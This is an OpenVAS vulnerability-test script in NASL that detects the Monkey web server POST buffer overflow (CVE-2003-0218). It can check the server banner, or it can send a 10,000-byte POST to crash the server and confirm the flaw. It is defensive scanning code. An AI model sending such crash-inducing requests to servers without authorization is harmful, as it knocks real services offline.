###############################################################################
# OpenVAS Vulnerability Test
# $Id: monkeyweb_too_big_post.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# MonkeyWeb POST with too much data
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Ref:
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# To: "BugTraq" <bugtraq@securityfocus.com>
# Subject: Monkey HTTPd Remote Buffer Overflow
# Date: Sun, 20 Apr 2003 16:34:03 -0500

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11544");
  script_version("$Revision: 13679 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-0218");
  script_bugtraq_id(7202);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("MonkeyWeb POST with too much data");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  # The listening port in the example configuration file is 2001
  # I suspect that some people might leave it unchanged.
  script_require_ports("Services/www", 80, 2001);
  script_mandatory_keys("Monkey/banner");

  script_tag(name:"solution", value:"Upgrade to Monkey web server 0.6.2.");

  script_tag(name:"summary", value:"The Monkey web server crashes when it receives a
  POST command with too much data.

  It *may* even be possible to make this web server execute arbitrary code with this attack.");

  script_tag(name:"insight", value:"The version of Monkey web server that is running
  is vulnerable to a buffer overflow on a POST command with too much data.");

  script_tag(name:"impact", value:"It is possible to make this web server crash or execute
  arbitrary code.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");

port = get_http_port( default:80 );

if( safe_checks() ) {

  banner = get_http_banner( port:port );
  if( banner =~ "Server: *Monkey/0\.([0-5]\.|6\.[01])" ) {
    report = report_fixed_ver( installed_version:"See server banner", fixed_version:"0.6.2" );
    security_message( port:port, data:report );
    exit( 0 );
  }
  exit( 99 );
}

if( http_is_dead( port:port ) ) exit( 0 );
l = http_get_kb_cgis( port:port, host:"*" );
if( isnull( l ) )
  script = "/";
else {
  # Let's take a random CGI.
  n = rand() % max_index( l );
  script = ereg_replace( string:l[n], pattern: " - .*", replace: "" );
  if( ! script )
    script = "/"; # Just in case the KB is corrupted
}

soc = http_open_socket( port );
if( ! soc ) exit( 0 );
req = http_post(item: script, port: port, data: crap(10000));

if( "Content-Type:" >!< req )
  req = ereg_replace( string:req, pattern:'Content-Length:', replace:'Content-Type: application/x-www-form-urlencoded\r\nContent-Length:' );

send( socket:soc, data:req );
r = http_recv( socket:soc );
http_close_socket( soc );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  set_kb_item( name:"www/too_big_post_crash", value:TRUE );
  exit( 0 );
}

exit( 99 );